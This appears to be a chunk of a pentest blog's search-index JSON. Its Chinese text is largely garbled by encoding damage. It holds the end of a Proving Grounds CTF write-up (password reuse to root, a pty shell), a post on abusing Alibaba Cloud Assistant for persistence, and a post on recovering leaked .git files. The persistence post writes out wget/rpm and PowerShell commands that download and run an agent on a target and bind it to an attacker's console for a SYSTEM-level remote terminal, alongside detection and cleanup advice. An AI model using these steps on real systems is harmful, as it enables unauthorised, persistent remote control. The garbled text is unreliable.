-----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_attachments_mimetypes\" image/*,text/plain -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_tags_num\" 5 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_tags_len\" 15 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"reply_min_chars\" 10 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"insert_oembed_videos\" yes -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_privacy\" everyone -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"approval_notify_mails\" -----------------------------337198322926933256222094173604 Co","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:2:1","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["é¶åœº"],"content":"PrivE â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords in config PHP files 'password' =\u003e 'FatPanda123', ç›´æ¥ææƒï¼Œå°è¯•å¯†ç å¤ç”¨ www-data@codo:/tmp$ su - su - Password: FatPanda123 id uid=0(root) gid=0(root) groups=0(root) python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; root@codo:~# ls /root/ ls /root/ email2.txt proof.txt snap root@codo:~# cat /root/proof.txt cat /root/proof.txt 6a78eexxxxxxxxx6bad8f ","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:3:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["Pentest"],"content":"Aliäº‘åŠ©æ‰‹æƒé™ç»´æŒ ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:0","tags":["Pentest","æƒé™ç»´æŒ","æ”»é˜²æŠ€æœ¯"],"title":"022-Aliäº‘åŠ©æ‰‹æƒé™ç»´æŒ","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"ç®€ä»‹ äº‘åŠ©æ‰‹æ˜¯ä¸“ä¸ºäº‘æœåŠ¡å™¨ ECS æ‰“é€ çš„åŸç”Ÿè‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ï¼Œé€šè¿‡å…å¯†ç ã€å…ç™»å½•ã€æ— éœ€ä½¿ç”¨è·³æ¿æœºçš„å½¢å¼ï¼Œåœ¨ ECS å®ä¾‹ä¸Šå®ç°æ‰¹é‡è¿ç»´ã€æ‰§è¡Œå‘½ä»¤ï¼ˆShellã€PowerShellã€Batç­‰ï¼‰å’Œå‘é€æ–‡ä»¶ç­‰æ“ä½œã€‚ å…¸å‹çš„ä½¿ç”¨åœºæ™¯åŒ…æ‹¬ï¼šå®‰è£…å¸è½½è½¯ä»¶ã€å¯åŠ¨æˆ–åœæ­¢æœåŠ¡ã€åˆ†å‘é…ç½®æ–‡ä»¶å’Œæ‰§è¡Œä¸€èˆ¬çš„å‘½ä»¤ï¼ˆæˆ–è„šæœ¬ï¼‰ç­‰ã€‚ ä½†å®é™…ä¸Šä¹Ÿå¯ä»¥é’ˆå¯¹ç»ˆç«¯ä¸»æœºè¿›è¡Œè¿œç¨‹è¿ç»´ï¼Œå› æ­¤å¯ä»¥ç”¨äºå®ç°æƒé™ç»´æŒã€‚ å®˜æ–¹æ–‡æ¡£ï¼š https://help.aliyun.com/zh/ecs/user-guide/overview-10 ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:0","tags":["Pentest","æƒé™ç»´æŒ","æ”»é˜²æŠ€æœ¯"],"title":"022-Aliäº‘åŠ©æ‰‹æƒé™ç»´æŒ","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"åˆ©ç”¨ 1ã€æ‰“å¼€é˜¿é‡Œäº‘æ§åˆ¶å°ï¼Œä¾æ¬¡æ‰¾åˆ° äº§å“ä¸æœåŠ¡ -\u003e äº‘æœåŠ¡å™¨ ECS -\u003e è¿ç»´ä¸ç›‘æ§ -\u003e å‘é€å‘½ä»¤/æ–‡ä»¶ï¼ˆäº‘åŠ©æ‰‹ï¼‰ -\u003e æ‰˜ç®¡å®ä¾‹ -\u003e åˆ›å»ºæ³¨å†Œç ï¼š 2ã€è¾“å…¥é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¦‚ä¸‹å†…å®¹ï¼š å®ä¾‹åç§°å‰ç¼€ é»˜è®¤çš„å®ä¾‹åç§°ã€‚é»˜è®¤ä½¿ç”¨ hostname ä½œä¸ºå®ä¾‹åç§°ã€‚ è‹¥è®¾ç½®ï¼Œåˆ™ä½¿ç”¨è¯¥æ³¨å†Œç æ‰€æ³¨å†Œçš„å®ä¾‹ï¼Œå°†ä½¿ç”¨è¯¥åç§°ä½œä¸ºå‰è¾ç”Ÿæˆæœ‰åºçš„å®ä¾‹åï¼› ä¹Ÿå¯ä»¥åœ¨æ³¨å†Œæ—¶æŒ‡å®šæ–°çš„å®ä¾‹åç§°ä»¥è¦†ç›–æ­¤é»˜è®¤å€¼ã€‚ åªå¯åŒ…å«ç‰¹æ®Šå­—ç¬¦ä¸­çš„ç‚¹å·ï¼ˆ.ï¼‰ã€ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ã€è¿å­—ç¬¦ï¼ˆ-ï¼‰å’ŒåŠè§’å†’å·ï¼ˆ:ï¼‰ æ¥æºIPé™åˆ¶ï¼š å¾…æ³¨å†Œçš„ä¸»æœºçš„è®¿é—®äº’è”ç½‘æ—¶çš„å…¬ç½‘IPæˆ–IPèŒƒå›´ï¼Œæ”¯æŒ IPv4ã€IPv6å’ŒCIDRåœ°å€æ®µã€‚ ä»…åœ¨ä¸»æœºæ³¨å†Œé˜¶æ®µè¿›è¡Œæ ¡éªŒã€‚ æ¿€æ´»æ•°é¢åº¦ï¼š æ³¨å†Œç å¯æ¿€æ´»çš„å®ä¾‹æ•°ï¼Œå³æ­¤æ³¨å†Œç æœ€å¤šå¯ç”¨äºæ³¨å†Œçš„æ¬¡æ•°ã€‚é»˜è®¤å€¼10ï¼Œæœ€å¤šå¯æ”¯æŒ1000å°ã€‚ æœ‰æ•ˆæœŸï¼š æ³¨å†Œç çš„æœ‰æ•ˆæœŸï¼Œé»˜è®¤4å°æ—¶ï¼Œå¯é€‰èŒƒå›´ 1ï½876576å°æ—¶ï¼ˆçº¦100å¹´ï¼ŒåŠæ°¸ä¹…ğŸ˜† ï¼‰ã€‚ è¶…å‡ºæœ‰æ•ˆæœŸåï¼Œè¯¥æ³¨å†Œç ä¸å¯ç”¨äºæ³¨å†Œæ–°çš„ä¸»æœºã€‚ 3ã€ç‚¹å‡»ç”Ÿæˆæ³¨å†Œç  å½“ç”Ÿæˆæ³¨å†Œç åï¼Œä¼šåœ¨ä¸‹æ–¹æ˜¾ç¤ºå®ä¾‹æ³¨å†Œçš„å‘½ä»¤è„šæœ¬å†…å®¹ã€‚è¯¥æ³¨å†Œç å†…å®¹åªæ˜¾ç¤ºä¸€æ¬¡ï¼Œå› æ­¤éœ€è¦ä¿å­˜æ­¤æ³¨å†Œç å”¯ä¸€IDä¸å†…å®¹ã€‚ æ”¯æŒLinux å’ŒWindows : Linux(.rpm) sudo wget https://aliyun-client-assist.oss-accelerate.aliyuncs.com/linux/aliyun_assist_latest.rpm sudo rpm -ivh aliyun_assist_latest.rpm --force sudo aliyun-service --register --RegionId \"cn-hangzhou\" \\ --ActivationCode \"a-hz012xxxxxL47fD/f\" \\ --ActivationId \"1DA9xxxxxxD244E7\" Linux(.deb) sudo wget https://aliyun-client-assist.oss-accelerate.aliyuncs.com/linux/aliyun_assist_latest.deb sudo dpkg -i aliyun_assist_latest.deb sudo aliyun-service --register --RegionId \"cn-hangzhou\" \\ --ActivationCode \"a-hz012xxxxxx47fD/f\" \\ --ActivationId \"1DA9xxxxxx3D244E7\" Windows Invoke-WebRequest -Uri ` 'https://aliyun-client-assist.oss-accelerate.aliyuncs.com/windows/aliyun_agent_latest_setup.exe' ` -OutFile 'C:\\\\aliyun_agent_latest_setup.exe' \u0026\"C:\\\\aliyun_agent_latest_setup.exe\" '/S' '--register' ` '--RegionId=\"cn-hangzhou\"' '--ActivationCode=\"a-hz012xxxxvttL47fD/f\"' ` '--ActivationId=\"1DA9xxxxx244E7\"' ç”Ÿæˆçš„æ³¨å†Œç ä¸­çš„å…³é”®å‚æ•°å°±æ˜¯ ActivationIdå€¼ å’Œ ActivationCodeå€¼ï¼ŒIdå’ŒCodeäº’ç›¸ç›¸äº’å¯¹åº”ï¼Œå¯ç‚¹å‡» â€œæ³¨å†Œæ–°å®ä¾‹â€ å¤„ï¼ŒæŸ¥çœ‹è¿‡å»å»ºç«‹ç”Ÿæˆçš„ ActivationId å€¼ï¼Œä½† ActivationCodeå€¼ä¸å¯æŸ¥ã€‚ ä½¿ç”¨é˜¿é‡Œäº‘ç»™å‡ºçš„å‘½ä»¤ä¸‹è½½äº‘åŠ©æ‰‹agentï¼Œå¯èƒ½ä¼šå‡ºç°æƒé™ä¸è¶³çš„æƒ…å†µï¼Œéœ€è¦å°†æ–‡ä»¶è¾“å‡ºåœ¨å½“å‰ç”¨æˆ·å¯å†™çš„è·¯å¾„ä¸‹ã€‚ ç¬¬ä¸€æ®µå‘½ä»¤ä¸ºä¸‹è½½äº‘åŠ©æ‰‹Agentï¼Œéœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼æŠ•é€’ã€‚ ç¬¬äºŒæ®µå‘½ä»¤ä¸ºäº‘åŠ©æ‰‹Agentæ³¨å†Œä¸Šçº¿ECSäº‘åŠ©æ‰‹æ§åˆ¶ç«¯ã€‚ åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œç›¸åº”è„šæœ¬ï¼Œæ‰§è¡Œå®Œä¹‹åéœ€è¦åˆ·æ–°æˆ–è€…é‡æ–°æ‰“å¼€ä¸€ä¸ªæ ‡ç­¾é¡µï¼Œå³å¯å±•ç¤ºç»“æœï¼š æ‰§è¡Œå‘½ä»¤ç›¸å½“äºåˆ›å»ºä¸€ä¸ªè„šæœ¬ï¼Œä¾æ¬¡å»æ‰§è¡Œï¼› è¿œç¨‹ç™»å½•å³ç±»ä¼¼ECSï¼Œå¼€å¯ä¸€ä¸ªWebå½¢å¼çš„ç»ˆç«¯ å¯ä»¥çœ‹åˆ°ç™»å½•åå³ä¸ºsystemæƒé™ã€‚ ç›®å‰å‘ç°ä¸€äº›é—®é¢˜ï¼š äº‘åŠ©æ‰‹Agentæ‰§è¡Œæ—¶æœ‰ UACè®¤è¯ï¼› Powershellæ‰§è¡Œå‘½ä»¤ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œéœ€è¦ç­‰å¾…ã€‚ åœ¨Windows Armä¸Šä¼šè¢«è¯†åˆ«ä¸ºUbuntu åªé€‚åˆå‘½ä»¤æ§åˆ¶ï¼Œä¼ è¾“æ–‡ä»¶å¤§å°æœ‰é™åˆ¶ï¼Œä¸Šä¼ çš„æ–‡ä»¶åŸå§‹å¤§å°ä¸å¤§äº24KBï¼Œä¸”ç»è¿‡Base64ç¼–ç åçš„æ–‡ä»¶ä¸èƒ½å¤§äº32KBã€‚å› æ­¤æ›´é€‚åˆä¸å‘½ä»¤æ§åˆ¶å’Œæƒé™ç»´æŒã€‚ ä¸€æ¡å‘½ä»¤ä¸­ï¼Œè‡ªå®šä¹‰å‚æ•°çš„ä¸ªæ•°ä¸èƒ½è¶…è¿‡20ä¸ª ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:3:0","tags":["Pentest","æƒé™ç»´æŒ","æ”»é˜²æŠ€æœ¯"],"title":"022-Aliäº‘åŠ©æ‰‹æƒé™ç»´æŒ","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"æ’æŸ¥ äº‘åŠ©æ‰‹Agentï¼š è¿è¡Œäº‘åŠ©æ‰‹åï¼ŒWindowsç³»ç»Ÿä¸Šä¼šæœ‰ä¸€ä¸ª aliyun_agentçš„è¿›ç¨‹å’Œä¸€ä¸ªAliyunServiceæœåŠ¡ï¼Œè¯¥è¿›ç¨‹æœåŠ¡ä¼šå¼€æœºè‡ªå¯ã€‚ äº‘åŠ©æ‰‹å®ˆæŠ¤è¿›ç¨‹ï¼š æœ¬åœ°ç»“æŸè¯¥è¿›ç¨‹åï¼Œè¿œç¨‹è¿æ¥å³å¯ç»ˆç«¯ã€‚æœªå‘ç°è¿›ç¨‹ä¿æŠ¤ç­‰åŠ¨ä½œã€‚ æŸ¥äº†æ–‡æ¡£å‘ç°å…¶å®æœ‰å®ˆæŠ¤è¿›ç¨‹ï¼Œåªæ˜¯ç›®å‰ä»…æ”¯æŒLinuxæ“ä½œç³»ç»Ÿã€‚ äº‘åŠ©æ‰‹å®ˆæŠ¤è¿›ç¨‹ï¼Œç”¨äºç›‘æ§äº‘åŠ©æ‰‹Agentçš„èµ„æºæ¶ˆè€—æƒ…å†µï¼Œä¸ŠæŠ¥äº‘åŠ©æ‰‹Agentçš„è¿è¡ŒçŠ¶æ€ï¼Œä»¥åŠå½“äº‘åŠ©æ‰‹Agentå´©æºƒæ—¶é‡å¯äº‘åŠ©æ‰‹Agentã€‚ æœåŠ¡åç§°ï¼šAssistDaemon è·¯å¾„ï¼š/usr/local/share/assist-daemon/assist_daemon ä»»åŠ¡æ‰§è¡Œè·¯å¾„ï¼š äº‘åŠ©æ‰‹ä¼šå°†ç”¨æˆ·çš„å‘½ä»¤å†…å®¹ä»¥æ–‡ä»¶å½¢å¼å…ˆä¿å­˜åˆ°å®ä¾‹ä¸Šï¼Œç„¶åå†æ‰§è¡Œæ–‡ä»¶ï¼Œå…·ä½“ä¿å­˜è·¯å¾„å¦‚ä¸‹ï¼š Linuxï¼š/tmp Windowsï¼šäº‘åŠ©æ‰‹å®‰è£…è·¯å¾„/work/script é€šä¿¡æµé‡ï¼š æœ¬åœ°Agentä¸Šçº¿åä¼šå…ˆå¯¹åŸŸåè¿›è¡Œè§£æï¼Œæ ¹æ®å‘½ä»¤è¡Œä¸­--RegionId=\"cn-hangzhou\"çš„é”®å€¼ï¼Œä¼šå¯»æ‰¾ç›¸åº”çš„èŠ‚ç‚¹ï¼Œè¿™é‡Œå°±æ˜¯cn-hangzhou.axt.aliyuncs.comã€‚ ä»TLSåè®®æ¡æ‰‹è¿‡ç¨‹å¯ä»¥çœ‹åˆ°Server Nameä¸ºcn-hangzhou.axt.aliyuncs.comï¼Œæ¥ä¸‹å»æ‰€èµ°çš„æµé‡éƒ½æ˜¯TLSåŠ å¯†æµé‡ã€‚ ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:4:0","tags":["Pentest","æƒé™ç»´æŒ","æ”»é˜²æŠ€æœ¯"],"title":"022-Aliäº‘åŠ©æ‰‹æƒé™ç»´æŒ","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"ç‰¹å¾ï¼š æ£€æµ‹é˜¿é‡Œäº‘åŠ©æ‰‹å®˜æ–¹ç¨‹åºï¼Œç¡®è®¤æ˜¯å¦æœ¬äººå®‰è£… åŸŸåï¼šaliyun-client-assist.oss-accelerate.aliyuncs.comï¼Œç”¨äºä¸‹è½½äº‘åŠ©æ‰‹Agentç¨‹åºï¼Œå¯è¢«ç»•è¿‡é€šè¿‡å…¶ä»–æ–¹å¼æŠ•é€’ã€‚ é€šä¿¡æµé‡ï¼ŒDNSè§£æè®°å½•æœ‰*.axt.aliyuncs.comï¼ŒTLS Client Hello è¯ä¹¦æ¡æ‰‹æ—¶Server Nameæ˜¯*.axt.aliyuncs.com è¿›ç¨‹åï¼šaliyun_agentï¼ŒæœåŠ¡åï¼šAliyun Assist Service Linuxç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹ï¼šAssistDaemon å¤©çœ¼åˆ†æä¸­å¿ƒæ—¥å¿—æ£€æµ‹ï¼ŒSSLåŠ å¯†åå•†ï¼šserver_name: (*.axt.aliyuncs.com) ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:5:0","tags":["Pentest","æƒé™ç»´æŒ","æ”»é˜²æŠ€æœ¯"],"title":"022-Aliäº‘åŠ©æ‰‹æƒé™ç»´æŒ","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"å¤„ç½® æ€è¿›ç¨‹ï¼Œå…³é—­æœåŠ¡ åˆ é™¤è¢«éæ³•å®‰è£…çš„Aliäº‘åŠ©æ‰‹ æ’æŸ¥å…¶ä»–æƒé™ç»´æŒåŠ¨ä½œå¹¶æ¸…é™¤ã€‚ å¢åŠ æµé‡ä¾§å’Œç»ˆç«¯ä¾§æ£€æµ‹ï¼Œæ ‡è®°md5å’ŒåŸŸåã€‚ ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:6:0","tags":["Pentest","æƒé™ç»´æŒ","æ”»é˜²æŠ€æœ¯"],"title":"022-Aliäº‘åŠ©æ‰‹æƒé™ç»´æŒ","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"å‚è€ƒæ–‡ç« ï¼š https://mp.weixin.qq.com/s/-JqzD_F_5CqdwZAyhEBU8g ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:7:0","tags":["Pentest","æƒé™ç»´æŒ","æ”»é˜²æŠ€æœ¯"],"title":"022-Aliäº‘åŠ©æ‰‹æƒé™ç»´æŒ","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"gitæºç æ³„éœ² ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:1:0","tags":["Pentest","Leaks"],"title":"021-Gitæ³„éœ²æ–‡ä»¶è¿˜åŸ","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"è‡ªåŠ¨åŒ– åˆ©ç”¨è„šæœ¬ï¼š Githack é‡åˆ°äº†ä¸€ä¸ªgitæ³„éœ²ï¼Œä½¿ç”¨å·¥å…·è¿›è¡Œåˆ©ç”¨ï¼Œå¤±è´¥ã€‚ æ‰‹åŠ¨è·å– git ç›®å½•ä¸‹æ–‡ä»¶æˆåŠŸï¼Œäºæ˜¯æƒ³æ‰‹åŠ¨åˆ©ç”¨ä¸‹è¯¥æ¼æ´ï¼Œå¹¶äº†è§£ä¸‹æ¼æ´åˆ©ç”¨åŸç†ã€‚ ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:2:0","tags":["Pentest","Leaks"],"title":"021-Gitæ³„éœ²æ–‡ä»¶è¿˜åŸ","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"ç›®å½•ç»“æ„ é¦–å…ˆ git ç›®å½•æ–‡ä»¶ç»“æ„ï¼Œé€šå¸¸åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š COMMIT_EDITMSG branches config # é¡¹ç›®çš„ Git é…ç½®æ–‡ä»¶ description HEAD # åŒ…å«å¯¹å½“å‰åˆ†æ”¯çš„å¼•ç”¨çš„æ–‡ä»¶ index hooks/ info/ logs/ objects/ # ç›®å½•ï¼Œå­˜å‚¨ Git å¯¹è±¡ refs/ .git æ–‡ä»¶å¤¹å­˜å‚¨é¡¹ç›®çš„å…ƒæ•°æ®å’Œå¯¹è±¡ã€‚è¿™é‡Œçš„â€œå¯¹è±¡â€åŒ…æ‹¬â€œblobâ€ã€â€œtreeâ€ã€â€œcommitâ€å’Œâ€œtagâ€ã€‚ blob â€” ç”¨æ¥å­˜å‚¨æ–‡ä»¶æ•°æ®çš„ä¸€ä¸ªæ–‡ä»¶ tree â€” å¼•ç”¨äº†ä¸€å †å…¶ä»–tree æˆ– blob commit â€” ä¸€ä¸ªå•ç‹¬çš„treeï¼Œæ ‡è®°ä¸ºé¡¹ç›®åœ¨æŸä¸ªæ—¶é—´ç‚¹çš„æ ·å­ã€‚ tag â€” ä»¥æŸç§æ–¹å¼å°†ç‰¹å®šæäº¤è¿›è¡ŒOæ ‡è®°ã€‚ ä»¥ä¸‹æ˜¯ .git ç›®å½•ä¸­çš„ä¸€äº›æ ‡å‡†æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œå®ƒä»¬å¯¹äºé‡å»ºé¡¹ç›®æºä»£ç éå¸¸é‡è¦ã€‚ ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:3:0","tags":["Pentest","Leaks"],"title":"021-Gitæ³„éœ²æ–‡ä»¶è¿˜åŸ","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"/objectsç›®å½• /objects ç›®å½•ç”¨äºå­˜å‚¨ Git å¯¹è±¡ã€‚ è¯¥ç›®å½•åŒ…å«å…¶ä»–æ–‡ä»¶å¤¹ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹éƒ½æœ‰ä¸¤ä¸ªè§’è‰²åç§°ã€‚è¿™äº›å­ç›®å½•ä»¥å­˜å‚¨åœ¨å…¶ä¸­çš„ git å¯¹è±¡çš„ SHA1 å“ˆå¸Œå€¼çš„å‰ä¸¤ä¸ªå­—ç¬¦å‘½åã€‚ åœ¨è¿™äº›å­ç›®å½•ä¸­ï¼Œæœ‰ä¸€äº›ä»¥å­˜å‚¨åœ¨å…¶ä¸­çš„ git å¯¹è±¡çš„ SHA1 å“ˆå¸Œå€¼å‘½åçš„æ–‡ä»¶ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢çš„å‘½ä»¤å°†è¿”å›æ–‡ä»¶å¤¹åˆ—è¡¨ï¼š \u003e ls .git/objects 00 0a 14 5a 64 6e 82 8c 96 a0 aa b4 be c8 d2 dc e6 f0 fa info pack æ­¤å‘½ä»¤å°†æ˜¾ç¤ºå­˜å‚¨åœ¨è¯¥ç‰¹å®šæ–‡ä»¶å¤¹ä¸­çš„ git å¯¹è±¡ï¼š \u003e ls .git/objects/0a 082f2656a655c8b0a87956c7bcdc93dfda23f8 4a1ee2f3a3d406411a72e1bea63507560092bd 66452433322af3d319a377415a890c70bbd263 8c20ea4482c6d2b0c9cdaf73d4b05c2c8c44e9 ee44c60c73c5a622bb1733338d3fa964b333f0 0ec99d617a7b78c5466daa1e6317cbd8ee07cc 52113e4f248648117bc4511da04dd4634e6753 72e6850ef963c6aeee4121d38cf9de773865d8 Git å¯¹è±¡æ ¹æ®å…¶ SHA1 å“ˆå¸Œå€¼çš„å‰ä¸¤ä¸ªå­—ç¬¦å­˜å‚¨åœ¨ /objects ä¸­ã€‚ ä¾‹å¦‚ï¼Œå“ˆå¸Œå€¼ä¸º0a082f2656a655c8b0a87956c7bcdc93dfda23f8 çš„ Git å¯¹è±¡å°†ä»¥æ–‡ä»¶å 082f2656a655c8b0a87956c7bcdc93dfda23f8 å­˜å‚¨åœ¨ç›®å½• .git/objects/0a ä¸­ã€‚ Git åœ¨ .git/objects ä¸­å­˜å‚¨ä¸åŒç±»å‹çš„å¯¹è±¡ã€‚è¿™é‡Œå­˜å‚¨çš„å¯¹è±¡å¯ä»¥æ˜¯commit,ã€treeã€blob å’Œå¸¦æ³¨é‡Šçš„tagã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¡®å®šå¯¹è±¡çš„ç±»å‹ï¼š \u003e git cat-file -t \u003cOBJECT-HASH\u003e è¿™ä¸ªhashéœ€è¦å†™å®Œæ•´çš„å“ˆå¸Œè€Œä¸æ˜¯å•çº¯çš„æ–‡ä»¶å â”Œâ”€â”€(xavierğŸ’€Desktop-AQ550M)-[~/â€¦/gitlab/git/objects/0a] â””â”€$ ls 66007207cbbbf3fc8e506ca4bc9e7317770060 a78bbdd307fd4839b26d61166b5c0532064bec â”Œâ”€â”€(xavierğŸ’€Desktop-AQ550M)-[~/â€¦/gitlab/git/objects/0a] â””â”€$ git cat-file -t 66007207cbbbf3fc8e506ca4bc9e7317770060 fatal: Not a valid object name 66007207cbbbf3fc8e506ca4bc9e7317770060 â”Œâ”€â”€(xavierğŸ’€Desktop-AQ550M)-[~/â€¦/gitlab/git/objects/0a] â””â”€$ git cat-file -t 0a66007207cbbbf3fc8e506ca4bc9e7317770060 blob æäº¤å¯¹è±¡å­˜å‚¨æœ‰å…³æäº¤çš„ç›®å½•æ ‘å¯¹è±¡å“ˆå¸Œã€çˆ¶æäº¤ã€ä½œè€…ã€æäº¤è€…ã€æ—¥æœŸå’Œæäº¤æ¶ˆæ¯çš„ä¿¡æ¯ã€‚ Treeå¯¹è±¡åŒ…å«æäº¤çš„ç›®å½•åˆ—è¡¨ã€‚ Blob å¯¹è±¡åŒ…å«å·²æäº¤çš„æ–‡ä»¶çš„å‰¯æœ¬ï¼ˆè¯·é˜…è¯»ï¼šå®é™…æºä»£ç ï¼ï¼‰ã€‚è€Œtagå¯¹è±¡åŒ…å«æœ‰å…³æ ‡è®°å¯¹è±¡åŠå…¶å…³è”æ ‡è®°åç§°çš„ä¿¡æ¯ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ˜¾ç¤ºä¸ Git å¯¹è±¡å…³è”çš„æ–‡ä»¶ï¼š \u003e git cat-file -p \u003cOBJECT-HASH\u003e â”Œâ”€â”€(xavierğŸ’€Desktop-AQ550M)-[~/â€¦/git/gitlab/git/objects] â””â”€$ git cat-file -t 06a67bade0fd6621314daadc38300c908e989dd0 blob â”Œâ”€â”€(xavierğŸ’€Desktop-AQ550M)-[~/â€¦/git/gitlab/git/objects] â””â”€$ git cat-file -p 06a67bade0fd6621314daadc38300c908e989dd0 # By Xavier import sys import requests import urllib3 import time urllib3.disable_warnings() ... ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:3:1","tags":["Pentest","Leaks"],"title":"021-Gitæ³„éœ²æ–‡ä»¶è¿˜åŸ","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"/configæ–‡ä»¶ /config æ–‡ä»¶æ˜¯é¡¹ç›®çš„ Git é…ç½®æ–‡ä»¶ã€‚å¦‚æœè¯¥æ–‡ä»¶å¯è®¿é—®ï¼Œä¹Ÿè®¸èƒ½å¤Ÿä¸‹è½½ .git ç›®å½•çš„å…¨éƒ¨å†…å®¹ã€‚ â”Œâ”€â”€(xavierğŸ’€Desktop-AQ550M)-[~/â€¦/0727/git/gitlab/git] â””â”€$ cat config [core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true [remote \"origin\"] url = git@github.com:Username/Projectname.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master [pull] rebase = false ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:3:2","tags":["Pentest","Leaks"],"title":"021-Gitæ³„éœ²æ–‡ä»¶è¿˜åŸ","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"/headæ–‡ä»¶ /headæ–‡ä»¶æ˜¯ä¸€ä¸ªåŒ…å«å¯¹å½“å‰åˆ†æ”¯çš„å¼•ç”¨çš„æ–‡ä»¶ â”Œâ”€â”€(xavierğŸ’€Desktop-AQ550M)-[~/â€¦/0727/git/gitlab/git] â””â”€$ cat HEAD ref: refs/heads/master 